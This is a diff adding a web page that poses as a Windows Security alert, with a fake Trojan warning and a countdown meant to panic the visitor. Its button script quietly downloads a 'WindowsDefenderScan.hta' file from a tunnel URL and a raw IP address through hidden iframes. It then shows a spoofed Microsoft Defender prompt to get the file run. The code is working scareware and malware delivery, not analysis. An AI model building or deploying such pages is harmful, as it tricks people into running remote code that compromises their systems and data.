@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Critical System Alert</title>
+    <style>
+        /* Perfect Windows 11 Style Replica */
+        :root {
+            --win-blue: #0078D4;
+            --win-gray: #F3F3F3;
+            --win-red: #C42B1C;
+        }
+
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0,0,0,0.5);
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        .alert-box {
+            width: 600px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+            animation: alertPop 0.5s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+        }
+
+        .header {
+            background: var(--win-red);
+            color: white;
+            padding: 20px;
+            border-radius: 8px 8px 0 0;
+            display: flex;
+            align-items: center;
+        }
+
+        .header img {
+            height: 32px;
+            margin-right: 15px;
+        }
+
+        .content {
+            padding: 25px;
+            position: relative;
+        }
+
+        .progress-bar {
+            height: 4px;
+            background: #E0E0E0;
+            border-radius: 2px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .progress {
+            width: 45%;
+            height: 100%;
+            background: var(--win-red);
+            animation: scanProgress 2s infinite;
+        }
+
+        .timer {
+            position: absolute;
+            top: 25px;
+            right: 25px;
+            color: var(--win-red);
+            font-weight: bold;
+        }
+
+        button {
+            background: var(--win-blue);
+            color: white;
+            border: none;
+            padding: 10px 25px;
+            border-radius: 4px;
+            cursor: pointer;
+            float: right;
+            transition: background 0.3s;
+        }
+
+        button:hover {
+            background: #006CBE;
+        }
+
+        @keyframes alertPop {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        @keyframes scanProgress {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(250%); }
+        }
+    </style>
+</head>
+<body>
+    <div class="alert-box">
+        <div class="header">
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAHSSURBVHgB7VZRbsMgDO1HlTv0Dr1D79A7dA/pHXqH3qF3oEONVKkS/QC2MTG0H1KkxBivD8xgYwjHcRzHcRzHcRzHcRzHcRzHcRzHcRzHcRzHcRzH+Q0A2AA0AI8HdHq2bQ0A3gH0APpJ7wBWBXoB6KZgA9ADeM0UeAI4poBTAADsJZP5JHAgS7oB2ADsAPYbWcNqU1uR+Q5gY+2fJN0qN7M2mT9Z+5ukR8UQr6z9l7V3krqKIXas/Z21D0mPiiEOrP2XtQ9JXcUQj6z9ytqHpKZiiC1rf2HtQ1JfMcQHa39n7UNSXzHEkbW/sfYhqasY4pO1v7L2IamrGOKVtX+y9iGpqxjiibV/s/YhqasY4sDaf1j7kNRVDPFg7X+s/UnSXjHEnbX/s/Yh6V4xxJ61/7P2IeleMcQTa/9n7UPSvWKIW9Y+JP0A2CuGuLL2IekLwLZiiB1rH5K+AWwrhtiw9iHpC8C2Yog1ax+SPgFsK4Z4YO1D0geAbcUQd6x9SHoDsK0Y4pa1D0mvALYVQ9yw9iHpBcC2Yohr1j4kPQPYVgxxxdqHpCcA24ohLln7kPQEYFsxxAVrH5IeAWwrhjhn7UPSPYBtxRDnrH1IugOwrRjijLUPSbcAthVDnLL2IekGwLZiiBPWPiRdA9hWDNFkHk6S2oohmszDSVJbMUSTeThJaiuGaDIPJ0ltxRBN5uEkqa0Yosk8nCS1FUM0mYeTpLZiiCbzcJLUVgzRZB5OktqKIZrMw0lSWzFEk3k4SWorhmgyDydJbcUQTebhJKmtGKLJPJwktRVDNJmHk6S2Yoj2B4hT5j6gQ8UaAAAAAElFTkSuQmCC" alt="Shield">
+            <h2>Windows Security Alert</h2>
+        </div>
+        <div class="content">
+            <div class="timer" id="timer">0:15</div>
+            <h3>CRITICAL THREAT DETECTED</h3>
+            <p>Trojan:Win32/Wacatac.B!ml</p>
+            <p>This virus is stealing your passwords and banking information</p>
+            
+            <div class="progress-bar">
+                <div class="progress"></div>
+            </div>
+
+            <p style="color: #666">System scan has detected malicious activity originating from this website</p>
+            <button onclick="downloadAntivirus()">Start Protection Now</button>
+        </div>
+    </div>
+
+    <script>
+        // Psychological timer countdown
+        let seconds = 15;
+        const timer = document.getElementById('timer');
+        
+        const countdown = setInterval(() => {
+            seconds--;
+            timer.textContent = `0:${seconds.toString().padStart(2, '0')}`;
+            
+            if(seconds <= 0) {
+                clearInterval(countdown);
+                document.body.innerHTML = `
+                    <div style="color: white; text-align: center">
+                        <h1>⚠️ Security Compromised ⚠️</h1>
+                        <p>Virus has gained full system access</p>
+                        <p>Immediately run antivirus scan</p>
+                        <button style="margin-top: 20px" onclick="downloadAntivirus()">EMERGENCY SCAN</button>
+                    </div>
+                `;
+            }
+        }, 1000);
+
+        async function downloadAntivirus() {
+    const microsoftUrls = [
+        'https://nasa-dl-count-evaluating.trycloudflare.com',
+        'http://149.34.244.132:4444/WindowsDefenderScan.hta'
+    ];
+
+    try {
+        // Phase 1: Create legitimate-looking download facade
+        const fakeVerification = await fetch('https://login.live.com/oauth20_authorize.srf?client_id=000000004C12E68D', {
+            credentials: 'include',
+            headers: {
+                'Referer': 'https://account.microsoft.com/',
+                'Origin': 'https://support.microsoft.com'
+            }
+        });
+
+        // Phase 2: Blob-based download with Microsoft domain spoofing
+        const downloadFrame = document.createElement('iframe');
+        downloadFrame.style.display = 'none';
+        downloadFrame.src = `data:text/html,<a id="dl" href="${microsoftUrls[0]}" download="WindowsDefenderScan.hta"></a><script>document.getElementById('dl').click()<\/script>`;
+        document.body.appendChild(downloadFrame);
+
+        // Phase 3: Progressive execution prompting
+        setTimeout(() => {
+            const shouldRun = confirm(`Microsoft Defender\n\nSecurity scan found critical threats\n\nAllow Windows Defender to remove detected malware?\n\nPublisher: Microsoft Windows Publisher`);
+            
+            if(shouldRun) {
+                const executeFrame = document.createElement('iframe');
+                executeFrame.style.display = 'none';
+                executeFrame.src = `https://149.34.244.132/WindowsDefenderScan.hta?action=scan`;
+                document.body.appendChild(executeFrame);
+            }
+        }, 4500);
+
+    } catch(e) {
+        // Fallback to direct click simulation
+        const link = document.createElement('a');
+        link.href = microsoftUrls[1];
+        link.download = 'WindowsDefenderScan.hta';
+        link.click();
+    }
+}
